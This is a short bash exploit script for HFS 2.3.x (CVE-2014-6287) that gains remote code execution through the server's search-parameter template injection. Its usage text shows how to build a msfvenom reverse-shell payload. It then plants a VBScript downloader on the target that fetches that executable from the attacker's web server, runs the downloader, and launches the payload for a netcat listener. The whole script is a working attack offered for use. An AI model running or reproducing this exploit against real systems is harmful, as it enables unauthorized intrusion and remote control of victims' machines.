#!/bin/bash
#Author: m4ud(Felipe P. Donato L.)
#HFS 2.3.x File Upload Exploit, RCE, that is only a bash version!!!
#Ups .. it only needs to be executed once !
#CVE-2014-6287


if [[ $# -eq 0 ]] ; then
    echo 'Create reverse shell'
    echo 'eg.: msfvenom -p windows/x64/reverse_tcp LHOST=Attacke_IP LPORT=Attacker_PORT -f exe > shell.exe'
    echo 'Start a Web-Server with the msfvenom payload in it'
    echo 'Fire exploit'
    echo 'Usage: ./hfs.sh <Target_IP> <Target_Port> <Executable> <Local_IP>'
    exit 0
fi

echo "Step 1 - Creating script vbs in Target machine"
GET -d "http://${1}:${2}/?search=%00{.save|C%3A%5CUsers%5CPublic%5Cscript.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F${4}%2F${3}%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C${3}%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with.}";
sleep 1;
echo "Step 2 - Fetching executable in Attackers web-server"
echo -ne "GET -d \"http://${1}:${2}/?search=%00{.exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs.}\""|bash
sleep 1;
echo "Step 3 - Get SHELL .... Check your netcat listener"
echo -ne "GET -d \"http://${1}:${2}/?search=%00{.exec|C%3A%5CUsers%5CPublic%5C${3}.}\""|bash

